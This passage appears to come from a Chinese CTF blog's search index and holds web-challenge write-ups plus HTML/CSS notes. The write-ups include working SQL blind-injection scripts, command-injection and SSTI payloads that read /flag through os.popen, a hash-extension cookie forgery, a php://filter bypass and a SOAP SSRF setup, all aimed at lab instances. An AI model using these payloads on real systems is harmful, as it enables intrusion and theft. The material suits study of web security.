而我们已知的md5(key+data)就相当于已知前一个数据块计算后得到的计算向量。 在key长度已知的情况下，我们只要人为补充padding，就可以使attach成为下一个数据块内容， 在key参与下计算的向量一定是正确的，也就确保拿已知md5继续计算下去得到的md5是正确的。 我们拿到md5值后，就可以完成验证，完成哈希长度扩展攻击攻击了。 hashpumpem……这个本地实现还挺难搞的……，hashpump工具可以轻松完成这些工作🐕！ 使用也十分简介明了，已知md5，data，key的长度，附加字段，就可以生成对应md5和填充好的数据 解题 可以看到key的长度，同时根据hint，param为flag.txt，共24位。attach自然是read 123456789@app.route('/De1ta', methods=['GET', 'POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if (waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) \\ 向/De1ta页面的cookie字段提交sign和action即可： 1234567891011import requestsurl = 'http://9c8d9029-c3f0-495e-a6b1-d806896df4a2.node3.buuoj.cn/De1ta?param=flag.txt'##将生成\\x转换成%cookies = { 'sign': '2b865fed1aca31784de5754a868533a3', 'action':'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read' }res = requests.get(url=url, cookies=cookies)print(res.text) ok","link":"/2021/03/21/De1CTF-2019-SSRF-Me(%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"},{"title":"CISCN2019-华北赛区-Day2-Web1-Hack-World","text":"[CISCN2019 华北赛区 Day2 Web1]Hack World1.题目：数字型注入+脚本2.过程把表名和列名都列出来了，就等你注了…… 但是好多字符包括空格都给过滤了，试好久也试不出来…… 但是：1/1、4/2是可以出结果的，也就是说，可以借助逻辑判断返回1和0，判断逻辑的真假。 借助之前sqli学到的布尔盲注： id=if(length((select(flag)from(flag)))=42,1,0) 说明flag有42个字符，这要一个一个注……很多题解上都用了脚本，反正时间充裕，我就针对python脚本学习了下 ​ 1.requests模块通过POST请求传参 ​ 2.字符串拼接变量 ​ 3.处理requests请求结果 ​ 4.复习Acwing的二分法模板：1227. 分巧克力 ​ 5.time.sleep()延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数） 其实学的写的都挺粗糙的……最后也调试了好久，不过看见脚本成功运行还是很开心的： 123456789101112131415161718192021import requestsimport timeurl = 'http://2bd5e0bf-74ef-4b72-90b8-315541a82d9d.node3.buuoj.cn/'flag=&quot;&quot;for x in range(1,43): l = 32 r = 126 while r &gt; l: mid = int((l+r+1) / 2) x = str(x) y = str(mid) id = {&quot;id&quot;:'if(ascii(substr((select(flag)from(flag)),'+x+',1))&gt;='+y+',1,0)'} response = requests.post(url=url,data=id) if &quot;Hello&quot; in response.text: l = mid else: r = mid-1 time.sleep(0.03) flag+=(chr(int(r))) print(chr(int(r)))print(flag) 0.03还是比较稳定、比较快的，出的flag也比较正常。 emmm，这样我就有自己的布尔盲注脚本了。 🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗","link":"/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/"},{"title":"FBCTF2019-RCEService","text":"[FBCTF2019]RCEService 提交json格式的命令？ 原本题目是提供了源码的： 123456789101112131415161718192021222324&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 这里就是preg_match的两种绕过方法之一 ：PHP利用PCRE回溯次数限制绕过某些安全限制 https://www.freebuf.com/articles/web/190794.html php采用pcre作为正则表达式库，为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit。我们可以通过var_dump(ini_get('pcre.backtrack_limit'));的方式查看当前环境下的上限. 假设我们的回溯次数超过了 100 万，preg_match返回的非 1 和 0，而是 false。 所以，我们可以利用这个特性使得匹配到的1变为false 在构造的json数据中构造，若匹配不到，会一步一步回溯： 123456import requestspayload = '{&quot;cmd&quot;:&quot;ls&quot;,&quot;haha&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'res = requests.post(&quot;http://8ccd1800-50a8-437a-b276-5606fc62242c.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})print(res.text) 因为putenv('PATH=/home/rceservice/jail');设置了环境变量，我们需要绝对路径来使用命令 Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 查proc环境变量查不出来，只能查到cmdline…… pwd：/var/www/html 查一下设置的环境变量发现了flag cat下即可：/bin/cat /home/rceservice/flag","link":"/2021/04/18/FBCTF2019-RCEService/"},{"title":"Firstone","text":"你好！","link":"/2020/11/19/Firstone/"},{"title":"EasyBypass","text":"EasyBypassbuu新上题，想必不久之后就会成一分题了…… 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);$comm1 = $_GET['comm1'];$comm2 = $_GET['comm2'];if(preg_match(&quot;/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1)) $comm1 = &quot;&quot;;if(preg_match(&quot;/\\'|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2)) $comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = '&quot;' . $comm1 . '&quot;';$comm2 = '&quot;' . $comm2 . '&quot;';$cmd = &quot;file $comm1 $comm2&quot;;system($cmd);?&gt; 过滤绕过rce 一番尝试发现，comm2的过滤比comm1严格的多，那就只用comm1，闭合后面的引号即可执行命令 读取flag的时候发现flag也有过滤，然而f\\lag就行了…… /?comm1=-f&quot; &quot;/etc/hosts ?comm1=-f&quot; /fla\\g;od /fla\\g;&quot; od倒是可以用…… 拼接亦可：?comm1=-f&quot; ;a=ca;b=t;c=g;$a$b /fla$c;&quot; 方法挺多……","link":"/2021/04/15/EasyBypass/"},{"title":"GYCTF2020-Ezsqli","text":"[GYCTF2020]Ezsqliid是注入点，4/2发现是数值型注入……测试下： information都被过滤了……这里必须要绕过这个过滤 information_schema绕过聊一聊bypass information_schema mysql注入绕过information_schema过滤 information_schema代替方法 sys.schema_table_statistics_with_bufferSELECT * from sys.schema_table_statistics_with_buffer table_schema table_name rows_fetched fetch_latency rows_inserted insert_latency rows_updated update_latency rows_deleted delete_latency io_read_requests io_read io_read_latency io_write_requests io_write io_write_latency io_misc_requests io_misc_latency innodb_buffer_allocated innodb_buffer_data innodb_buffer_free innodb_buffer_pages innodb_buffer_pages_hashed innodb_buffer_pages_old innodb_buffer_rows_cached 可以看到有table_schema和table_name，借此可以获得表名： 但是我们没有列名，这里需要 无列名注入https://www.jianshu.com/p/4a084ea1c7d4 https://zhuanlan.zhihu.com/p/98206699 运用到sql比较字符串的特性，当两个字符串做比较运算时，会先比较首位字符，若首位相同，则比较第二位…… id=2||((select 1,”g”)&gt;(select * from f1ag_1s_h3r3_hhhhh))# 两边查询的列数要相同 捋顺逻辑用二分法写脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# coding=utf-8import requestsimport timeflag = &quot;&quot;url = &quot;http://bec2be36-f01b-4b15-bc93-dc44e0b9fbb6.node3.buuoj.cn/&quot;data1 = &quot;&quot;# 库名data2 = &quot;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))&gt;={}#&quot;# 表名data3 = &quot;&quot;# 列名data4 = &quot;&quot;# 数据data5 = &quot;2||((select 1,'{}')&lt;=(select * from f1ag_1s_h3r3_hhhhh))#&quot;# 字符串移位比较+无列名data = data5# 选择post数据for x in range(1, 200): l = 32 r = 127 while r &gt; l: mid = int((l + r + 1) / 2) x = str(x) y = str(mid) if data != data5: pay = { &quot;id&quot;: data.format(x, y) } else: pay = { &quot;id&quot;: data.format(flag+chr(int(y))) } # print(pay) # 这里需更改注入点 response = requests.post(url=url, data=pay) # print(response.text) if &quot;Nu1L&quot; in response.text: l = mid else: r = mid - 1 # time.sleep(0.03) flag += (chr(int(r))) print(chr(int(r))) print(flag)print(flag) 搭了个post架，也不知道好不好用…… 转小写得到flag…… flag{333ed6af-c961-438b-91fd-c578e87536a6}","link":"/2021/05/04/GYCTF2020-Ezsqli/"},{"title":"GXYCTF2019-BabySQli","text":"[GXYCTF2019]BabySQli1.题目：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！2.过程：可以猜到username是admin，只会提示wrong pass……那就只能在username注入 POST……用burpsuit 发现有一段密文：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 试试解密：先base32，再base64：select * from user where username = ‘$name’ 不清楚有什么用欸……查一下sql里的MD5加密语句： 这个应该很接近题目了。网上很多猜测源码的……GitHub上有源码： 只查了一行，所以用union的特性，构造： name=3’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’–+&amp;pw=123 此时获取的是union的虚表，select ‘admin’,0,’202cb962ac59075b964b07152d234b70’ 是不行的 第二列应该是username，第三列是password；即arr[1]和arr[2]。 202cb962ac59075b964b07152d234b70即123的MD5编码……得flag","link":"/2021/01/27/GXYCTF2019-BabySQli/"},{"title":"GXYCTF2019-PingPingPing","text":"[GXYCTF2019]Ping Ping Ping1.题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping2.过程： ping功能原理是向网络上的机器的唯一确定的IP地址发送一个数据包，对方就要返回一个同样大小的数据包，根据返回的数据包我们可以确定目标主机的存在，两台网络机器是否连接相通，时延是多少。 在进行ping功能的命令同时，可使其同时执行额外的其他命令 这需要用到一些命令管道符： |：直接执行后面的语句 ||：如果前面的语句执行出错，则执行后面的语句，否则仅执行前面的语句 &amp;：前后的语句均可执行，但是前面的语句如果执行结果为假（即执行失败），则仅输出后面语句的结果 &amp;&amp;：如果前面的语句为假，则直接报错，也不执行后面的语句 ;：多个语句不互相影响 详细：https://blog.csdn.net/youshaoduo/article/details/106607038 所以用：?ip=127.0.0.1||ls，可以得到： 1234/?ip=PING 127.0.0.1 (127.0.0.1): 56 data bytesflag.phpindex.php 用cat flag，显示：/?ip= fxck your space! …… cat&lt;&gt;flag =&gt; /?ip= 1fxck your symbol! 这里有一个关于空格的过滤： {IFS}，$IFS$9，$IFS$1，&lt;，&lt;&gt;，{cat,test.txt} ，…… cmd=$’\\x20test.txt’&amp;&amp;cat$cmd x20为16进制数，为32，\\转义字符根据ASCII表，为空格…… payload中有flag：/?ip= 1fxck your flag!…… 先访问index.php，payload：?ip=127.0.0.1||cat$IFS$9index.php 1234567891011121314151617181920/?ip=PING 127.0.0.1 (127.0.0.1): 56 data bytes/?ip=|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match)){ echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); } else if(preg_match(&quot;/ /&quot;, $ip)){ die(&quot;fxck your space!&quot;); } else if(preg_match(&quot;/bash/&quot;, $ip)){ die(&quot;fxck your bash!&quot;); } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){ die(&quot;fxck your flag!&quot;); } $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);}?&gt; 显示了具体的过滤机制，如果要绕过flag的匹配，可以考虑借助$a，进行拼接。 ?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php em，拼接好像只能在最后一位，不然好像会出现变量名识别的错误…… 123&lt;?php$flag = &quot;flag{835db201-f524-4497-a7f5-fca850954a63}&quot;;?&gt; 好像是当做php语句执行了，查看源码可以看到（大概）……","link":"/2020/12/06/GXYCTF2019-PingPingPing/"},{"title":"HCTF-2018-admin","text":"[HCTF 2018]admin1.题目：2.过程：又是学习dalao操作的一天： 一、flask session 伪造 应该是要获取admin的账号……网页通过session识别用户的身份： session是浏览器与服务器交互的会话，这个session可以来验证访问者的身份，大多数的session都是保存在服务器的，但是也有少部分是客户端session，如flask框架。 传统PHP中session都是被放在服务器中的，用户只是看到一串随机字符串，真正的session内容在服务器中，flask是一个python轻量级web框架，他的session存储在客户端的cookie字段中，为了防止session篡改，flask进行了一定的处理，代码存放在flask模块中sessions.py文件中。 flask session 的加解密需要一个secret-key： 源码中的config文件中可以被找到 用 flask-session-cookie-manager 对cookie进行解密： 解密： python flask_session_cookie_manager3.py decode -s SECRET_KEY -c “session” 加密： python flask_session_cookie_manager3.py encode -s SECRET_KEY -t “未加密session” 在index中： 只验证了session中的’name’即可： 修改cookie即可以admin身份登录获取flag…… 二、Unicode欺骗 在change页面可以清楚的看到，对获取到的name进行了小写处理。python中含有小写函数：lower() 这里用的是strlower： 用到了nodeprepare.prepare，这个方法从Twisted库中导出： 这里的Twisted版本很低，dalao怀疑这里有漏洞……搜索了一下相关内容： https://engineering.atspotify.com/2013/06/18/creative-usernames/中记录了因为使用nodeprepare.prepare导致的一起漏洞。注册时， ‘ᴮᴵᴳᴮᴵᴿᴰ’经处理得到‘BIGBIRD’，就成功注册了‘BIGBIRD’账户，但在修改密码时，再次对name使用了nodeprepare.prepare。那么修改的账户就变成‘bigbird’，原来的bigbird账户的密码就被控制了。官方的原话为： ”We were relying on nodeprep.prepare being idempotent, and it wasn’t.“ 转化为小写的函数原本应当是幂等的，但在这个特殊情况下，两次的结果是不同的。 在https://news.ycombinator.com/item?id=5902506的讨论中： 似乎是python的工作方式的改变破坏了Twisted库。 或许是因为某些原因导致不支持ᴮᴵᴳᴮᴵᴿᴰ字符，进行了强制的转换？到这里我仍不是很明白。Unicode同形字引起的安全问题中介绍了关于Unicode转ASCII的GitHub的漏洞，但不是ᴬᴰᴹᴵᴺ到ADMIN的转换。 我找到了Unicode的标准化处理： unicodedata.normalize(form, unistr) 把一串UNICODE字符串转换为普通格式的字符串，具体格式支持NFC、NFKC、NFD和NFKD格式。 Unicode标准定义了四种规范化形式： Normalization Form D (NFD)，Normalization Form KD (NFKD)，Normalization Form C (NFC)，和Normalization Form KC (NFKC)。大约来说，NFD和NFKD将可能的字符进行分解，而NFC和NFKC将可能的字符进行组合。 NFC（Normalization Form C）使用最少的码位构成等价的字符串；NFD把组合字符分解成基字符和单独的组合字符； 在另外两个规范化形式（NFKC和NFKD）的首字母缩略词中，字母K表示“compatibility”（兼容性）。这两种是较严格的规范形式，对“兼容字符”有影响。 =》https://blog.csdn.net/weixin_38492159/article/details/107135663 NFKC和NFKD下，都会转换为ADMIN；NFC和NFD下，仍为ᴬᴰᴹᴵᴺ。 大概是该方法在遇到ᴬᴰᴹᴵᴺ时，因为某些原因只进行了规范化而没有转化为小写导致了漏洞吧……更深的就不知道了…… p大：https://www.leavesongs.com/PENETRATION/client-session-security.html 关于Unicode安全的好像有一道Unicode shop，回来可以写写。 三、条件竞争……确实不是很懂，先贴dalao题解，学习学习： https://blog.csdn.net/weixin_44677409/article/details/100733581 https://www.anquanke.com/post/id/164086 ……wohaocai","link":"/2021/02/23/HCTF-2018-admin/"},{"title":"Hgame2021-week3-Forgetful","text":"Forgetful 记录一下学习过程： 1.题目：Liki 总是忘记很多事情，于是她灵机一动，用新学会的 Python 写了一个 TodoList，快用起来吧！2.过程：讲解 页面有一个记录的功能，可以记录一些事项： 查看后发现7*7被执行了，存在SSTI…… 跟着步骤实验： 看到了许多类名： __class__ 返回type类型，查看对象的类型__bases__ 返回tuple类型，列出该类的基类_mro_\\ 返回tuple类型，给出解析方法调用的顺序_subclasses_\\() 返回内建方法builtin_function_or_method，获取一个类的子类__globals__ 返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量 那怎么从这么多的类中找到一个包含我们需要模块的一个类呢，用脚本吗…… 我随手登录的账号已经有了一位老哥的操作： 查了一下： 是一个方法，从中可以直接调用os执行命令……tql 安洵杯2020 官方Writeup： 1{%print(lipsum|attr(%22\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f%22))|attr(%22\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%} =》 1{%print(lipsum|attr(&quot;__globals__&quot;))|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()%} 这里的print绕过{{}}和attr绕过.，Unicode应该是绕过一些字符过滤。 利用这个方法去读： 学长是用base64去读的： 1{{lipsum.__globals__['os'].popen('base64 /flag').read()}} 这样就可以读取了： 1{{''.__class__.__base__.__subclasses__()[165].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;base64 /flag&quot;).read()')}} 也ok","link":"/2021/02/18/Hgame2021-week3-Forgetful/"},{"title":"HarekazeCTF-2019-encode_and_encode","text":"HarekazeCTF-2019-encode_and_encode上来就是源码……： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');//接受post数据$json = json_decode($body, true);//json解密，故body需要为合法json字符串if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) {//body中需含有page字段 $page = $json['page']; $content = file_get_contents($page);//读取 if (!$content || !is_valid($content)) {//过滤传参，一些伪协议，flag $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); is_valid过滤了很多协议还有遍历，随便起协议名再遍历读取是不能用了…… json转义json为提供一些特殊字符的传输，支持了Unicode，如：json_encode会将中文转换为unicode编码 所以此处使用Unicode即可绕过检查。 { “page” : “\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067”} flag{5c3db6bf-f5c9-4926-a809-ea7b4d23c37d} 获得flag……","link":"/2021/05/04/HarekazeCTF-2019-encode-and-encode/"},{"title":"Html和css笔记","text":"Html和css的学习笔记：http://www.imooc.com/learn/9 鉴于时间一长就忘得差不多了，做一些笔记以供参考，有些杂乱琐碎…… 1.1、css是用来修饰html样式的 2、html本身是有一些默认样式,如果我们想改变html标签的样式,就需要借助css 3、html+css构成了我们网页的基本页面结构和样式 2. :文档类型声明，表示该文件为 HTML5文件。&lt;!DOCTYPE&gt; 声明必须是 HTML 文档的第一行，位于 标签之前 标签对：标签位于HTML文档的最前面，用来标识HTML文档的开始；标签位于HTML文档的最后面，用来标识HTML 文档的结束；这两个标签对成对存在，中间的部分是文档的头部和主题。 3.标签对：标签包含有关HTML文档的信息，可以包含一些辅助性标签。如，，，等，但是浏览器除了会在标题栏显示元素的内容外，不会向用户显示head元素内的其他任何内容。 4.标签对：它是HTML文档的主体部分，在此标签中可以包含等众多标签，标签出现在标签之后，且必须在闭标签之前闭合。 3.1、head标签为双标签，有尾标签，。 2、head标签表示头部标签,通常用来嵌套meta、title、style等标签。 3、标签：在和标签之间的文字内容是网页的标题信息，它会出现在浏览器的标题栏中。网页的title标签用于告诉用户和搜索引擎这个网页的主要内容是什么，搜索引擎可以通过网页标题，迅速的判断出网页的主题。每个网页的内容都是不同的，每个网页都应该有一个独一无二的title。 4、设置当前文件字符编码 5、style标签：双标签中设置当前文件样式 4.在这一章节我们要开始把网页中常用到的标签一 一向大家介绍，学习这一章节的时候要记住学习html标签过程中，主要注意两个方面的学习：标签的用途、标签在浏览器中的默认样式。 标签的用途：我们学习网页制作时，常常会听到一个词，语义化。那么什么叫做语义化呢，说的通俗点就是：明白每个标签的用途（在什么情况下使用此标签合理）比如，网页上的文章的标题就可以用标题标签，网页上的各个栏目的栏目名称也可以使用标题标签。文章中内容的段落就得放在段落标签中等等 讲了这么多语义化，但是语义化可以给我们带来什么样的好处呢？ 更容易被搜索引擎收录。 更容易让屏幕阅读器读出网页内容。 5.标签，这个标签是没有语义的，它的作用就是为了设置单独的样式用的。 如果现在我们想把下面的第一段话“美国梦”三个字设置成blue（蓝色），所以这样情况下就可以用到标签了。 6.文章的段落用标签，那么文章的标题用什么标签呢？在本节我们将使用标签来制作文章的标题。标题标签一共有6个，h1、h2、h3、h4、h5、h6分别为一级标题、二级标题、三级标题、四级标题、五级标题、六级标题。并且依据重要性递减。是最高的等级。语法：标题文本 (x为1-6)文章的标题前面已经说过了，可以使用标题标签，另外网页上的各个栏目的标题也可使用它们。如下图为腾讯网站 7.在网页制作过程过中，可以把一些独立的逻辑部分划分出来，放在一个标签中，这个标签的作用就相当于一个容器。 语法： … 确定逻辑部分： 什么是逻辑部分？它是页面上相互关联的一组元素。如网页中的独立的栏目版块，就是一个典型的逻辑部分。如下图所示：图中用红色边框标出的部分就是一个逻辑部分，就可以使用标签作为容器。 8.各位慕课网的小伙伴，大家好，我们继续我们的快乐代码之旅。从这一章节开始,我们来学习html5新增的语义化标签,首先我们来学习header标签，用来定义头部区域。标签定义底部区域 9.定义区段 10. 定义侧边栏区 11.在需要加回车换行的地方加入，标签作用相当于word文档中的回车。xhtml1.0写法： html4.01写法： 大家注意，现在一般使用 xhtml1.0 的版本的写法（其它标签也是），这种版本比较规范。 与以前我们学过的标签不一样，&lt;br /&gt;标签是一个空标签，没有HTML内容的标签就是空标签，空标签只需要写一个开始标签，这样的标签有&lt;br /&gt;、&lt;hr /&gt;和&lt;img /&gt;。 讲到这里，你是不是有个疑问，想折行还不好说嘛，就像在 word 文件档或记事本中，在想要折行的前面输入回车不就行了吗？很遗憾，在 html 中是忽略回车和空格的，你输入的再多回车和空格也是显示不出来的。如下边的代码。 总结：在 html 代码中输入回车、空格都是没有作用的。在html文本中想输入回车换行，就必须输入。 12. 使用标签实现水平线标签&nbsp; 13.这些列表就可以使用ul-li标签来完成。ul-li是没有前后顺序的信息列表。 语法： 信息 信息 ...... 举例： 精彩少年 美丽突然出现 触动心灵的旋律 14.使用标签来制作有序列表来展示。语法： 信息 信息 ...... 举例： 下面是一个热点课程下载排行榜： 前端开发面试心法 零基础学习html JavaScript全攻略 在网页中显示的默认样式一般为：每项前都自带一个序号，序号默认从1开始 15. 在网页的制作中为使网页炫丽美观，肯定是缺少不了图片，可以使用标签来插入图片。 语法： &lt;img src=”图片地址” alt=”下载失败时的替换文本” title = “提示文本”&gt; 举例： &lt;img src = “myimage.gif” alt = “My Image” title = “My Image” /&gt; 讲解： 1、src：标识图像的位置； 2、alt：指定图像的描述性文本，当图像不可见时（下载不成功时），可看到该属性指定的文本； 3、title：提供在图像可见时对图像的描述(鼠标滑过图片时显示的文本)； 4、图像可以是GIF，PNG，JPEG格式的图像文件。 16.使用标签可实现超链接，它在网页制作中可以说是无处不在，只要有链接的地方，就会有这个标签。 语法： &lt;a href=”目标网址” title=”鼠标滑过显示的文本”&gt;链接显示的文本例如： &lt;a href=”http://www.imooc.com&quot; title=”点击进入慕课网”&gt;click here!上面例子作用是单击click here!文字，网页链接到http://www.imooc.com这个网页。 title属性的作用，鼠标滑过链接文字时会显示这个属性的文本内容。这个属性在实际网页开发中作用很大，主要方便搜索引擎了解链接地址的内容（语义化更友好），如右侧案例代码（11-13行）。 注意：还有一个有趣的现象不知道小伙伴们发现了没有，只要为文本加入a标签后，文字的颜色就会自动变为蓝色（被点击过的文本颜色为紫色），颜色很难看吧，不过没有关系后面我们学习了css样子就可以设置过来（a{color:#000}),后面会详细讲解。 17.创建表格的四个元素：table、tr、th、td 1、…：整个表格以标记开始、标记结束。 2、…：表格的一行，所以有几对tr 表格就有几行。 3、…：表格的一个单元格，一行中包含几对…，说明一行中就有几列。 4、…：表格的头部的一个单元格，表格表头。 5、表格中列的个数，取决于一行中数据单元格的个数。 6、border属性可以为表格添加边框，属性值为数字。 注意： 1、table标签用来定义整个表格，为双标签，必须有结束标签。 2、table标签里面可以放caption标签和tr标签。 3、caption标签用来定义表格的标题。 4、tr标签用来设置表格的行，tr里面只能放th或者td标签，一组tr标签代表一行。 5、th用来设置表格的标题，会加粗居中显示。也就是th标签中的文本默认为粗体并且居中显示。 6、td同来设置表格的列，一组td标签代表一列。 7、table表格在没有添加border属性之前, 在浏览器中显示是没有表格线的。","link":"/2020/11/28/Html%E5%92%8Ccss%E7%AC%94%E8%AE%B0/"},{"title":"MRCTF2020-Ezpop_Revenge","text":"[MRCTF2020]Ezpop_Revenge做了ezpop，看到这道题，就想尝试一下，结果……无语凝噎 进入题目，是一个搭建的博客，扫出www.zip网站源码： （非常恐怖 这里有很多网页的代码，既然是Revenge，应该是反序列化题目，在文件内查找： 123456789101112//Plugin.phppublic function action(){ if(!isset($_SESSION)) session_start(); if(isset($_REQUEST['admin'])) var_dump($_SESSION); if (isset($_POST['C0incid3nc3'])) { if(preg_match(&quot;/file|assert|eval|[`\\'~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo &quot;Not that easy.&quot;; } } } 这里可以反序列化了一个post的数据，并且做了过滤……不管如何利用，先从这里找，在这个文件上方有一个类： 1234567class HelloWorld_DB{ private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }} wakeup的魔法方法，可以反序列化调用，跟进Typecho_Db： （代码太多，这里选择有用的部分 123456789101112//Db.phpclass Typecho_Db{ private $_adapter; private $_prefix; private $_adapterName; public function __construct($adapterName, $prefix = 'typecho_') { $this-&gt;_adapterName = $adapterName; $adapterName = 'Typecho_Db_Adapter_' . $adapterName; } 进行了拼接，（大概）可以联想到toString方法，那有没有呢？（很多……一定要注意其形式是否可以利用，经验和感觉很重要，嗯，玄学） 12345678910111213141516171819202122232425//Query.phppublic function __toString() { switch ($this-&gt;_sqlPreBuild['action']) { case Typecho_Db::SELECT: return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); case Typecho_Db::INSERT: return 'INSERT INTO ' . $this-&gt;_sqlPreBuild['table'] . '(' . implode(' , ', array_keys($this-&gt;_sqlPreBuild['rows'])) . ')' . ' VALUES ' . '(' . implode(' , ', array_values($this-&gt;_sqlPreBuild['rows'])) . ')' . $this-&gt;_sqlPreBuild['limit']; case Typecho_Db::DELETE: return 'DELETE FROM ' . $this-&gt;_sqlPreBuild['table'] . $this-&gt;_sqlPreBuild['where']; case Typecho_Db::UPDATE: $columns = array(); if (isset($this-&gt;_sqlPreBuild['rows'])) { foreach ($this-&gt;_sqlPreBuild['rows'] as $key =&gt; $val) { $columns[] = &quot;$key = $val&quot;; } } } 一个针对sql语句的条件分支，注意select这里： 1return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); 就很像反序列化练习中__call函数的调用，查了一下__call函数，似乎没有利用点…… SOAP 反序列化dalao：https://zhuanlan.zhihu.com/p/80918004 SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。 为php安装soap拓展后： 可以看到，SoapClient类自带有__call方法，由此诞生了SOAP反序列化ssrf利用。 本地重复实验： 1234567891011121314151617&lt;?php$target = 'http://127.0.0.1:5555/path';$post_string = 'data=something';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=my_session' );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = 